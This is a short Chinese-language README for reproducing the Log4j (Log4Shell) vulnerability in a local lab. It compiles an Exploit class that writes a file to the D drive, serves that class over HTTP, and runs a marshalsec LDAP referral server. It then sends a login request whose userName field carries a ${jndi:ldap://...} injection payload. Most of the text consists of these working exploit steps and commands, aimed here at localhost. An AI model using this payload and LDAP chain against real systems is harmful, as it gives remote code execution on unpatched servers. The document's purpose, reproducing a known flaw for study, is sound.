# log4j漏洞复现
## 复现步骤
1. 启动springboot-user模块,这个模块模拟一个正常的系统，有个登录接口
2. 进入根目录下的src目录，运行Exploit的main方法，该方法会在d盘创建一个1.txt文件,可自行修改，运行之后在target目录下会生成Exploit.class文件
3. 在本地启动http服务,如nginx,使其可以通过http链接访问到Exploit.class，如http://127.0.0.1:4444/Exploit.class
4. 使用maven打包marshalsec模块，执行后，如果可以在marshalsec的target模块中看到marshalsec-0.0.3-SNAPSHOT.jar，表明执行成功
5. 使用终端进入到marshalsec的target目录下，执行命令，启动ldap服务
```text
// 将其中的127.0.0.1:4444换成http服务的ip和端口号
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  "http://127.0.0.1:4444/#Exploit" 1389
```
6. 请求登录接口，观察结果
```text
POST http://localhost:8080/login
Content-Type: application/x-www-form-urlencoded

userName=${jndi:ldap://127.0.0.1:1389/#Exploit}
```